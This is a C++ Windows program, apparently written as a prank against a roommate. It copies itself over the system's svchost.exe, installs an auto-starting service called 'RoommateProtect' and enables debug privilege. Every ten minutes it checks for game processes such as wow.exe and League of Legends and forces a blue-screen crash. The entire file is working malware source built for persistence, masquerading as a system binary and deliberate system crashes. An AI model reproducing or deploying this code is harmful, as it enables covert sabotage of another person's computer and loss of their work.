//main.cpp
//Author:sometimes.naive
//E-mail:sometimes.naive[at]hotmail.com
//Last update:Apr. 14th , 2016a
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "cekproc.h"
#include <stdlib.h>
#include <time.h>
#include "bsod.hpp"

#define BAD_EXIT \
		_tprintf(_T("Bad Parameters.\n")),\
		abort();
#define THROWERR(x) throw expection(x)

LPCTSTR lpszProgramFileName[]={
	_T("wow.exe"),
	_T("league of legends.exe"),
	_T("lolclient.exe")
	//such as : "***.exe"
};

SERVICE_STATUS_HANDLE ssh;
SERVICE_STATUS ss;
HANDLE hdThread,hdProcess;

void WINAPI Service_Main(DWORD, LPTSTR *);
void WINAPI Service_Control(DWORD);
void Func_Service_Install();
DWORD ______EnablePrivilege() ;
TCHAR buf1[1000],buf2[1000],buf3[1000],szline[1000];

enum _Parameters{
	EXEC_START_NORMAL		=1,
	EXEC_START_SERVICE		=2,
	EXEC_BAD_PARAMETERS		=1073741824
};

TCHAR const *szParameters[]={
	_T("svc")
};
TCHAR Sname[]=_T("RoommateProtect");
const TCHAR *SzName[]={
	Sname
};
SERVICE_TABLE_ENTRY STE[2]={{Sname,(LPSERVICE_MAIN_FUNCTION)Service_Main},{NULL,NULL}};

int __fastcall __Check_Parameters(int argc,TCHAR const **argv){
	if (argc==1) return EXEC_START_NORMAL;
	if (argc>2 ||!((argv[1][0]==_T('/') ||
		argv[1][0]==_T('-')) && argv[1][1]!=_T('\0'))) BAD_EXIT;
	size_t i=0;
	for (;_tcscmp(&(argv[1][1]),szParameters[i]) &&
		i<sizeof(szParameters)/sizeof(szParameters[0]);i++);
	switch (i){
		case 0: return EXEC_START_SERVICE;
		default: BAD_EXIT;
	}
	BAD_EXIT;
}

int _tmain(int argc,LPCTSTR * argv){
	SetConsoleTitle(_T("heiheihei"));
	switch(__Check_Parameters(argc,argv)){
		case EXEC_START_NORMAL:
			Func_Service_Install();
			exit(EXIT_SUCCESS);
			break;
		case EXEC_START_SERVICE:
			______EnablePrivilege();
			StartServiceCtrlDispatcher(STE);
			break;
		default: BAD_EXIT;
	}
	return 0;
}

void Func_Service_Install(){
	struct expection{
		const TCHAR * Message;
		expection(const TCHAR *_){
			this->Message=_;
		}
	};
	SC_HANDLE shMang=NULL,shSvc=NULL;
	try{
		if (!GetEnvironmentVariable(_T("SystemRoot"),buf3,BUFSIZ))
			THROWERR(_T("GetEnvironmentVariable() Error in Install Service."));
		_stprintf(buf1,_T("%s\\svchost.exe"),buf3);
		_stprintf(buf2,_T("\"%s\\svchost.exe\" -svc"),buf3);
		if (!GetModuleFileName(NULL,szline,sizeof(szline)/sizeof(TCHAR)))
			THROWERR(_T("GetModuleFileName() Error in Install Service."));
		_tprintf(_T("    Step1:Copy file.\n"));
		if (!CopyFile(szline,buf1,FALSE))
			THROWERR(_T("CopyFile() Error in Install Service.(Is service has been installed?)"));
		_tprintf(_T("    Step2:Connect to SCM.\n"));
		if (!(shMang=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS)))
			THROWERR(_T("OpenSCManager() failed."));
		_tprintf(_T("    Step3:Write service.\n"));
		if (!(shSvc=CreateService(shMang,Sname,_T("Protect Roommate"),
		SERVICE_ALL_ACCESS,SERVICE_WIN32_OWN_PROCESS,SERVICE_AUTO_START,SERVICE_ERROR_NORMAL,
			buf2,NULL,NULL,NULL,NULL,NULL))){
			if (GetLastError()==ERROR_SERVICE_EXISTS){
				if (!(shSvc=OpenService(shMang,Sname,SERVICE_ALL_ACCESS)))
					THROWERR(_T("OpenService() Error in install service."));
				if (!DeleteService(shSvc))
					THROWERR(_T("DeleteService() Error in Install Service."));
				CloseServiceHandle(shSvc);
				if (!(shSvc=CreateService(shMang,Sname,_T("Protect Roommate"),
				SERVICE_ALL_ACCESS,SERVICE_WIN32_OWN_PROCESS,SERVICE_AUTO_START,SERVICE_ERROR_NORMAL,
				buf2,NULL,NULL,NULL,NULL,NULL)))
					THROWERR(_T("CreateService() failed.(2)")),CloseServiceHandle(shMang);
			}
			else
				THROWERR(_T("CreateService() failed."));
		}
		else 
			_tprintf(_T("Install service successfully.\n"));
		if (!(shSvc=OpenService(shMang,Sname,SERVICE_START)))
				THROWERR(_T("OpenService() Failed"));
			else
				if (!StartService(shSvc,1,SzName))
					THROWERR(_T("StartService() Failed."));
					else 
				MessageBox(NULL,_T("Service started successfully"),_T("Congratulations!"),
				MB_SETFOREGROUND|MB_ICONINFORMATION);
		
	}
	catch (expection runtimeError){
		_tprintf(_T("\nFatal Error:\n%s (GetLastError():%ld)\n\
Please contact the application's support team for more information.\n"),
		runtimeError.Message,GetLastError());
		_tprintf(_T("\n[Debug Message]\n%s\n%s\n%s\n"),buf1,buf2,buf3);
		abort();
	}
	CloseServiceHandle(shMang);
	CloseServiceHandle(shSvc);
	system("pause");
	return ;
}

/*
**   Kill! Kill! Kill! Kill! Kill! Kill! Kill! Kill!
*/

DWORD CALLBACK Main_Thread(LPVOID){
	srand(time(NULL));
	for (DWORD dwProcessID;;Sleep(1000*60*10))//10 min
		for (size_t i=0;i<sizeof(lpszProgramFileName)/sizeof(lpszProgramFileName[0]);i++)
			if (isExecExist(lpszProgramFileName[i],&dwProcessID)){/*
				hdProcess=OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcessID);
				TerminateProcess(hdProcess,EXIT_SUCCESS);
				CloseHandle(hdProcess);
				if (isExecExist(lpszProgramFileName[i],&dwProcessID)){
					memset(buf1,0,sizeof(buf1)/sizeof(TCHAR));
					_stprintf(buf1,_T("taskkill /f /im \"%s\""),lpszProgramFileName[i]);
					ShellExecute(NULL,_T("open"),buf1,NULL,NULL,0);
				}*/
				CallBSODNow;
			}
	return 0;
}

void WINAPI Service_Main(DWORD,LPTSTR *){
	ssh=RegisterServiceCtrlHandler(Sname,Service_Control);
	ss.dwServiceType=SERVICE_WIN32_OWN_PROCESS;
	ss.dwCurrentState=SERVICE_START_PENDING;
	ss.dwControlsAccepted=SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_SHUTDOWN;
	ss.dwServiceSpecificExitCode=0;
	ss.dwWin32ExitCode=0;
	ss.dwCheckPoint=0;
	ss.dwWaitHint=1000;
	SetServiceStatus(ssh,&ss);
	hdThread=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)Main_Thread,NULL,0,NULL);
	ss.dwCurrentState=SERVICE_RUNNING;
	ss.dwCheckPoint=0;
	ss.dwWaitHint=0;
	SetServiceStatus(ssh,&ss);
	WaitForSingleObject(hdThread,INFINITE);
	Sleep(200);
	return ;
}

DWORD ______EnablePrivilege(){
	TOKEN_PRIVILEGES _____TP;
	HANDLE _____hdToken;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &_____hdToken);
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &_____TP.Privileges[0].Luid);
	_____TP.PrivilegeCount = 1;
	_____TP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(_____hdToken, FALSE, &_____TP, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	CloseHandle(_____hdToken);
	return GetLastError();
}


void WINAPI Service_Control(DWORD dwControl){
	switch (dwControl)
	{
		case SERVICE_CONTROL_SHUTDOWN:
		case SERVICE_CONTROL_STOP:
			TerminateThread(hdThread,0);
			ss.dwCurrentState=SERVICE_STOPPED;
			ss.dwCheckPoint=0;
			ss.dwWaitHint=0;
			SetServiceStatus(ssh,&ss);
		default:break;
	}
}
